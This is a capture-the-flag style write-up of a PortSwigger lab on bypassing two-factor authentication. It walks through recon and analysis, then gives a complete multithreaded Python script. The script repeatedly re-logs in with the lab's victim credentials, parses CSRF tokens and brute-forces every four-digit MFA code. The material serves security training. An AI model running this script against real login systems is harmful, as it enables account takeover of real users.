# 2FA bypass using a brute-force attack

**Category:** Web Exploitation — Authentication
**Difficulty:** Expert
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack`

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

Victim's credentials: carlos:montoya 

Note

As the verification code will reset while you're running your attack, you may need to repeat this attack several times before you succeed. This is because the new code may be a number that your current Intruder attack has already attempted. 

---

## Reconnaissance

- What does the application do? 
    - The website is a blog about several, seemingly to tech related topics. Users can read and leave comments under blog articles.
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - There is an account page with a login, the comments below articles can be consideres input too.
- What happens with normal input?
    - Correct user logins log the user in normally after using the email client to retrieve the MFA code

---

## Analysis


#### Vulnerability

- What exactly is vulnerable and why?
    
The 2FA implementation is vulnerable. It locks the user out after inputting the wrong MFA code twice, but it doesn't stop one from just trying to login a lot of times until using the correct mfa code.

---

## Solution 

### Step 1 - Recon / Looking at responses

Everything works as expected when logging in, after two incorrect inputted MFA codes the user is locked out.
It is not possible to just bruteforce this because the anti-bruteforce mechanic locks us out after 2 tries which is quite a bit less than 10000 that we need (in reality we should find the correct login after around ~5000 tries).
But the actualy login request is not touched by that, so the idea is to just restart the actual login everytime the mfa code is incorrect, that means sending the chain of requests again and again. This should reset the lock-out counter to 0 everytime.
I will try to use python again for this lab, since the normal intruder takes forever in the community edition.

---

### Step 2 - Enumeration / Step 3 - Exploit

I looked at the way burp uses macros. In this lab the way to solve it with intruder is using a macro that send 4 requests in total:
```python
login = s.get(url + "/login")
login_post = s.post(url+"/login", data=csrf_dict)
login2 = s.get(url+"/login2")
login_post2 = s.post(url+"/login2", data=csrf_dict2)
```

The idea here is that after every login there is an mfa input and there are two tries for that, however there are endless tries to login in general.
So to try out every single mfa code one just needs to login 10000 times and try the codes 1 by 1.
That means going through the chain of going to the login page(`login`) inputting account name + password, pressing on the login button (`login_post`), which if successfull opens the webpage that has the mfa input form (`login2`). And inputting this code then happens in the second post request (`login_post2`) to submit the mfa code. THe only problem this has is the csrf token of the webpage that needs to be parsed from the get-response to the post-request to keep trying codes.

Since intruder takes forever I just used python with threading. The code looks a bit chaotic but is pretty simple all in all.
`find_mfa_code` goes through the chain of get-post-get-post and is called from a for-loop with the argument i which is used to create the mfa string.
The rest is threading and prasing the csrf token.

```python
import requests
import re
from threading import Thread

url="""https://0a5c00da03f351cd812c9db600ad00f3.web-security-academy.net/"""
results = []
def find_mfa_code(i):
        try:
            s = requests.Session() #to keep the cookies
            login = s.get(url + "/login")
            csrf = re.search(r'name="csrf" value="([^"]+)"', login.text).group(1)             #1 to get the first subgroup (the csrf value)
            user_data = {"username":"carlos", "password":"montoya"}
            csrf_dict = {"csrf":csrf}
            csrf_dict.update(user_data)
            login_post = s.post(url+"/login", data=csrf_dict)
            login2 = s.get(url+"/login2")
            csrf2 = re.search(r'name="csrf" value="([^"]+)"', login2.text).group(1)
            csrf_dict2 = {"csrf":csrf2}
            mfa_code = str(i).zfill(4)
            csrf_dict2.update({"mfa-code":mfa_code})
            login_post2 = s.post(url+"/login2", data=csrf_dict2)
            if login_post2.history:
                results.append(mfa_code)
        except requests.exceptions.ConnectionError:
             find_mfa_code(i)

threads = []
max_threads = 30


for i in range(10000):
    t = Thread(target=find_mfa_code, args=(i,))
    threads.append(t)
    t.start()
    if results:
         print(results[0])
         break
    if len(threads) >= max_threads:
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.join()

```

The moment the program finds the correct mfa code the lab is solved

---
## Real World Impact

The problem of the security mechanism here is, that it is not fully thought through. If the goal is to deny brute force why only implement it for mfa and not the whole login process as a a whole.

---
## Learnings

- To circumvent a security measure it is worth it to look at the step beforehand. Always look at the weakest link in the security chain


